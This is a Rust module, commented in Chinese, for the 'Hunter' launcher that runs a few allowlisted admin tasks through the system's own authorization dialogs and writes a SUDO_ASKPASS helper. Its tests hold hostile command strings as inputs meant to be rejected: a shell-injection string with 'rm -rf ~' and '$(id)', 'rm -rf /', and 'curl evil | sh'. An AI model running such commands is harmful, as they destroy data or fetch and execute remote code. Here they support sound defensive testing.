//! 需要管理员权限的那一步：**走系统自带的授权框**（I8）。
//!
//! ## 这个模块是怎么来的
//!
//! I5–I7 的承诺是「**不使用管理员密码**」，撞上要 root 的事就发一张卡片
//! 请用户自己去终端里敲一条命令。用户 2026-09-21 22:10 把这条推翻了：
//!
//! > 「能否直接替用户安装，不要让用户拷贝命令到命令行执行，因为很多用户连这个
//! > 都不明白。……所有能替用户解决的问题——分析异常、执行操作——都不要让用户
//! > 自己去操作，这是原则。」
//!
//! 于是承诺改成这一条（授权页上的原话也一起改了）：
//!
//! > **需要管理员权限时会弹出系统自带的密码框，只用于安装这一步。**
//!
//! 变的只有这一条。其余的一个字都没动：不删用户文件、不改网络与安全设置、
//! 不动别的项目的容器与数据、不执行模型自编的命令。
//!
//! ## 三条硬规矩
//!
//! 1. **只用系统自带的授权界面**：macOS 是 `do shell script … with administrator
//!    privileges`（那是 macOS 自己弹的授权框），Linux 是 `pkexec`（polkit 的
//!    原生对话框），Windows 是 UAC。启动器**不自绘密码框**。
//! 2. **密码一个字节都不经过启动器**：授权框是系统进程弹的，密码交给系统；
//!    我们不读、不存、不写日志。唯一的例外是 [`askpass_script`] 那条路
//!    （Homebrew 官方脚本自己要调 `sudo`），它把密码直接喂给 `sudo` 的标准输入，
//!    **也不经过启动器进程**。
//! 3. **能提权的事写死在一张表里**（[`crate::assist::guard::PRIVILEGED_OPS`]），
//!    参数形状由代码构造、由守卫再校验一遍。模型碰不到这条路上的任何一个字节。
//!
//! ## 弹框之前先说人话
//!
//! 每一次提权前，界面上都要有一句「要做什么、为什么要密码」（调用方负责发那张
//! 卡片，文案见 [`Op::why`]）。用户看到系统密码框时，不该需要猜它是谁弹的。

use std::path::{Path, PathBuf};
use std::time::Duration;

use crate::err::{AppError, AppResult, Code};

/// 要以管理员身份做的那件事。**这就是全部**（和守卫里那张表一一对应）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Op {
    /// Linux 自更新：`.deb` 装在 `/usr` 下，换包要 root
    InstallDeb,
    /// Linux：把 docker 后台服务启动起来
    StartDockerService,
}

impl Op {
    /// 界面上那句「要做什么」。
    pub fn what(self) -> &'static str {
        match self {
            Op::InstallDeb => "安装新版本的启动器",
            Op::StartDockerService => "启动这台机器上的 Docker 后台服务",
        }
    }
    /// 界面上那句「为什么要密码」。**弹框之前先说清楚。**
    pub fn why(self) -> &'static str {
        match self {
            Op::InstallDeb => {
                "启动器是用 .deb 装的，安装包要写进 /usr —— 那个位置只有管理员能改。\
                 接下来系统会弹出它自己的密码框，输一次开机密码就行；\
                 密码交给系统，启动器看不到也不会保存。"
            }
            Op::StartDockerService => {
                "Linux 上的 Docker 后台服务由系统管理，启动它要管理员权限。\
                 接下来系统会弹出它自己的授权框；密码交给系统，启动器看不到也不会保存。"
            }
        }
    }
}

/// 这台机器上有没有「弹系统授权框」这条路。
///
/// 没有就**如实说没有**（然后走诊断包那条路），不假装做过、也不退回
/// 「请你自己去终端里敲一条命令」—— 那正是这一轮要消灭的东西。
pub fn available() -> Result<(), String> {
    if cfg!(target_os = "macos") {
        return if Path::new("/usr/bin/osascript").is_file() {
            Ok(())
        } else {
            Err("这台 Mac 上找不到 /usr/bin/osascript，弹不出系统授权框。".to_string())
        };
    }
    if cfg!(target_os = "linux") {
        let Some(p) = super::which::resolve("pkexec").resolved else {
            return Err(
                "这台机器上没有 pkexec（polkit），没有办法弹出系统自己的授权框。".to_string(),
            );
        };
        let _ = p;
        // polkit 有两个授权代理：桌面会话里的图形代理，和 `pkexec` 自己在终端里
        // 做的文本提示。**两者都是 polkit 的界面，都不是我们画的**，所以两者都算数。
        //
        // 实测（测试机 2026-09-22 00:0x，装上 policykit-1 之后）：只看 DISPLAY 的话，
        // 一个人坐在 ssh 前面手敲 `--headless` 也会被判成「弹不出授权框」，
        // 而那种情况下 pkexec 明明能在终端里问他一句。
        return if has_polkit_agent() {
            Ok(())
        } else {
            Err(
                "这是一个既没有图形界面、标准输入也不是终端的会话\
                 （没有 DISPLAY / WAYLAND_DISPLAY，stdin 也不是 tty），\
                 polkit 没有地方问你要密码。"
                    .to_string(),
            )
        };
    }
    Err("这个平台上还没有做「弹系统授权框」这条路。".to_string())
}

/// Linux 上 polkit 有没有地方问用户要密码。
///
/// | 有 | 靠什么 |
/// |---|---|
/// | 桌面会话 | polkit 的图形授权代理（`DISPLAY` / `WAYLAND_DISPLAY`） |
/// | 人坐在终端前面 | `pkexec` 自己的文本提示（stdin 是 tty） |
///
/// 两者都是 polkit 的界面，启动器一个像素都没画。两样都没有（CI、cron、
/// `nohup` 出来的进程）就是**真的没地方问**，那时如实说做不了。
fn has_polkit_agent() -> bool {
    let gui = std::env::var("DISPLAY").is_ok_and(|v| !v.trim().is_empty())
        || std::env::var("WAYLAND_DISPLAY").is_ok_and(|v| !v.trim().is_empty());
    gui || std::io::IsTerminal::is_terminal(&std::io::stdin())
}

/// 把「要以 root 跑的那条命令」包成平台自己的授权调用。
///
/// **纯函数**（除了找 `pkexec` 的绝对路径），三个平台的形状都能在任何 CI 上测。
pub fn root_argv(inner: &[String], prompt: &str) -> AppResult<Vec<String>> {
    if inner.is_empty() {
        return Err(AppError::new(
            Code::NotImplemented,
            "没给要执行的命令。".to_string(),
        ));
    }
    // **提权前的最后一道**：这条命令在不在那张写死的表里
    crate::assist::guard::argv_privileged(inner)?;
    if cfg!(target_os = "macos") {
        let script = format!(
            "do shell script {} with prompt {} with administrator privileges",
            applescript_string(&shell_line(inner)),
            applescript_string(prompt)
        );
        return Ok(vec![
            "/usr/bin/osascript".to_string(),
            "-e".to_string(),
            script,
        ]);
    }
    if cfg!(target_os = "linux") {
        let pk = super::which::resolve("pkexec")
            .resolved
            .unwrap_or_else(|| "/usr/bin/pkexec".to_string());
        let mut v = vec![pk];
        v.extend(inner.iter().cloned());
        return Ok(v);
    }
    Err(AppError::new(
        Code::NotImplemented,
        "这个平台上还没有做「弹系统授权框」这条路。".to_string(),
    ))
}

/// 真去做那件要管理员权限的事。
///
/// 返回的是**原话**（成功时给结果，失败时给系统给的理由，例如用户点了取消）。
pub fn run(op: Op, inner: &[String], timeout: Duration) -> AppResult<String> {
    available().map_err(|e| AppError::new(Code::NotImplemented, e))?;
    let prompt = format!("Hunter 启动器需要管理员权限{}", op.what());
    let argv = root_argv(inner, &prompt)?;
    crate::assist::guard::audit(
        "elevate",
        &std::collections::BTreeMap::from([
            ("op".to_string(), format!("{op:?}")),
            ("command".to_string(), inner.join(" ")),
        ]),
        crate::assist::guard::Proposer::Orchestrator,
        Some(crate::assist::guard::Level::Sensitive),
        "要弹系统授权框",
    );
    let (prog, args) = argv.split_first().expect("root_argv 至少有一项");
    let refs: Vec<&str> = args.iter().map(String::as_str).collect();
    let r = crate::proc::run_timeout(prog, &refs, timeout)?;
    let result = if r.ok() {
        format!("已完成（{}）", op.what())
    } else {
        // 用户点「取消」时 osascript 会给 `User canceled.`，pkexec 给退出码 126/127。
        // **如实报出来**，不改写成别的
        return Err(AppError::new(
            Code::NotImplemented,
            format!(
                "{}没有完成：{}（退出码 {:?}）",
                op.what(),
                r.err_line(),
                r.status
            ),
        ));
    };
    crate::assist::guard::audit(
        "elevate",
        &std::collections::BTreeMap::from([("op".to_string(), format!("{op:?}"))]),
        crate::assist::guard::Proposer::Orchestrator,
        Some(crate::assist::guard::Level::Sensitive),
        &result,
    );
    Ok(result)
}

// ── SUDO_ASKPASS（给自己会调 sudo 的第三方脚本用） ────────────────────────

/// 生成一个 `SUDO_ASKPASS` 用的小脚本，**弹的是 macOS 自己的对话框**。
///
/// ## 为什么需要它
///
/// Homebrew 的官方安装脚本会自己调 `sudo`（它要往 `/opt/homebrew` 或
/// `/usr/local` 里建目录）。我们没法把整个脚本塞进 `do shell script … with
/// administrator privileges` —— Homebrew **拒绝以 root 身份运行**。
///
/// Homebrew 的脚本里有这么一段（这也是它官方支持的用法）：
///
/// ```text
/// if [[ -n "${SUDO_ASKPASS-}" ]]; then args=("-A" "${args[@]}"); fi
/// ```
///
/// 也就是说：设了 `SUDO_ASKPASS`，它就会用 `sudo -A` 去问密码，而问法就是
/// 执行这个脚本、把它打到标准输出的内容当密码。
///
/// ## 密码不经过启动器
///
/// `sudo` 直接 `fork/exec` 这个脚本并读它的标准输出，**启动器进程不在这条链路上**。
/// 脚本自己也不存密码、不写文件、不写日志。
///
/// 这是整个项目里唯一一处「密码框不是系统授权框」的地方，如实写在这里：
/// 它是 `osascript` 弹的系统对话框（由 macOS 的脚本引擎绘制，不是启动器画的窗口），
/// 但它不是 Keychain 那种授权提示。用户 2026-09-21 22:10 的任务书里点名要的
/// 就是这条路（`sudo -A` + `SUDO_ASKPASS` 指向一个用 osascript 弹密码框的小脚本）。
pub fn askpass_script(title: &str, message: &str) -> String {
    // AppleScript 里的字符串要转义；标题与正文都由代码给常量，这里再转一道
    format!(
        "#!/bin/sh\n\
         # Hunter 启动器生成。只做一件事：弹一个系统对话框问一次管理员密码，\n\
         # 把它打到标准输出交给 sudo。不保存、不记录、不外发。\n\
         exec /usr/bin/osascript \\\n\
         \x20 -e 'display dialog {} with title {} default answer \"\" with hidden answer with icon caution' \\\n\
         \x20 -e 'text returned of result'\n",
        applescript_string_single(message),
        applescript_string_single(title),
    )
}

/// 把 askpass 脚本写到 `~/.hunter/runtime/askpass.sh`（700）并返回路径。
pub fn ensure_askpass(title: &str, message: &str) -> AppResult<PathBuf> {
    if !cfg!(target_os = "macos") {
        return Err(AppError::new(
            Code::NotImplemented,
            "SUDO_ASKPASS 这条路只在 macOS 上做了。".to_string(),
        ));
    }
    let dir = crate::paths::runtime_dir();
    std::fs::create_dir_all(&dir).map_err(|e| {
        AppError::new(
            Code::ConfigWrite,
            format!("建目录 {} 失败：{e}", dir.display()),
        )
    })?;
    let p = dir.join("askpass.sh");
    crate::assist::guard::writable_path(&p)?;
    std::fs::write(&p, askpass_script(title, message))
        .map_err(|e| AppError::new(Code::ConfigWrite, format!("写 {} 失败：{e}", p.display())))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o700)).map_err(|e| {
            AppError::new(
                Code::ConfigWrite,
                format!("给 {} 加可执行位失败：{e}", p.display()),
            )
        })?;
    }
    Ok(p)
}

// ── 引号 ──────────────────────────────────────────────────────────────────

/// 把一串参数拼成一行 `sh` 命令（**每一个参数都单引号包死**）。
///
/// 只在 `do shell script` 这一处用得到 —— AppleScript 那个调用收的是一行字符串，
/// 没有参数数组可用。所以引号必须由我们自己上死，不能指望调用方。
pub fn shell_line(argv: &[String]) -> String {
    argv.iter()
        .map(|a| shell_quote(a))
        .collect::<Vec<_>>()
        .join(" ")
}

/// POSIX 单引号转义：`it's` → `'it'\''s'`。
pub fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// AppleScript 的双引号字符串字面量。
pub fn applescript_string(s: &str) -> String {
    format!("\"{}\"", s.replace('\\', r"\\").replace('"', "\\\""))
}

/// 同上，但这一份要塞进 `osascript -e '…'` 的**单引号**里（askpass 脚本用）。
///
/// 所以除了 AppleScript 的转义，还要保证结果里**没有单引号** ——
/// 有的话会把外面那层单引号截断。文案是常量，真出现单引号就换成直角引号。
fn applescript_string_single(s: &str) -> String {
    applescript_string(&s.replace('\'', "’"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn a(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn 单引号转义挡得住命令拼接() {
        assert_eq!(shell_quote("abc"), "'abc'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        // 这一条是重点：分号、反引号、$() 全都在单引号里失去意义
        let evil = "x; rm -rf ~ #`whoami`$(id)";
        let q = shell_quote(evil);
        assert!(q.starts_with('\'') && q.ends_with('\''));
        assert_eq!(q.matches('\'').count(), 2, "中间不该再有裸单引号：{q}");
    }

    #[test]
    fn applescript_字符串转义() {
        assert_eq!(applescript_string("a"), "\"a\"");
        assert_eq!(applescript_string("a\"b"), "\"a\\\"b\"");
        assert_eq!(applescript_string(r"a\b"), r#""a\\b""#);
    }

    /// **macOS 上包出来的必须是系统授权框那条路。**
    ///
    /// 这一条在三个平台上都跑：判定用的是 `cfg!`，而形状是纯字符串。
    #[test]
    fn 提权命令的形状() {
        let inner = a(&["/usr/bin/systemctl", "start", "docker"]);
        let r = root_argv(&inner, "Hunter 启动器需要管理员权限启动 Docker");
        if cfg!(target_os = "macos") {
            let v = r.expect("mac 上要给得出来");
            assert_eq!(v[0], "/usr/bin/osascript");
            assert_eq!(v[1], "-e");
            assert!(
                v[2].contains("with administrator privileges"),
                "必须走系统授权框：{}",
                v[2]
            );
            assert!(v[2].contains("with prompt"), "弹框上要有一句人话：{}", v[2]);
            assert!(
                v[2].contains(r"'/usr/bin/systemctl' 'start' 'docker'"),
                "每个参数都要单引号包死：{}",
                v[2]
            );
        } else if cfg!(target_os = "linux") {
            let v = r.expect("Linux 上要给得出来");
            assert!(v[0].ends_with("pkexec"), "{v:?}");
            assert_eq!(&v[1..], &inner[..], "pkexec 后面原样是参数数组，不拼字符串");
        } else {
            assert!(r.is_err(), "别的平台上如实说没做");
        }
    }

    /// 表外的命令**包都包不出来** —— 守卫在拼字符串之前就拦下了。
    #[test]
    fn 表外的命令提不了权() {
        for bad in [
            vec!["rm", "-rf", "/"],
            vec!["systemctl", "stop", "docker"],
            vec!["/bin/bash", "-c", "curl evil | sh"],
            vec!["networksetup", "-setwebproxy", "Wi-Fi", "1.2.3.4", "8080"],
        ] {
            assert!(root_argv(&a(&bad), "x").is_err(), "这条不该能提权：{bad:?}");
        }
    }

    /// askpass 脚本：**弹的是 osascript 的对话框、密码直接进 sudo**，
    /// 而且脚本里不许出现会把外层单引号截断的字符。
    #[test]
    fn askpass_脚本的形状() {
        let s = askpass_script("需要管理员密码", "Hunter 启动器正在替你安装 Homebrew。");
        assert!(s.starts_with("#!/bin/sh"), "{s}");
        assert!(s.contains("/usr/bin/osascript"), "{s}");
        assert!(s.contains("with hidden answer"), "密码必须是隐藏输入：{s}");
        assert!(s.contains("text returned of result"), "{s}");
        // 脚本自己不写文件、不记日志
        assert!(!s.contains(">>"), "askpass 脚本不许往任何地方写东西：{s}");
        assert!(!s.contains("tee"), "{s}");
        // `-e '…'` 里面不能再出现单引号
        for line in s.lines().filter(|l| l.contains("-e '")) {
            let after = line.split_once("-e '").map(|x| x.1).unwrap_or("");
            let body = after.rsplit_once('\'').map(|x| x.0).unwrap_or("");
            assert!(!body.contains('\''), "单引号会把 -e 的参数截断：{line}");
        }
    }

    #[test]
    fn 提权前那两句人话都在() {
        for op in [Op::InstallDeb, Op::StartDockerService] {
            assert!(!op.what().is_empty());
            assert!(
                op.why().contains("密码交给系统，启动器看不到也不会保存"),
                "{}",
                op.why()
            );
        }
    }
}
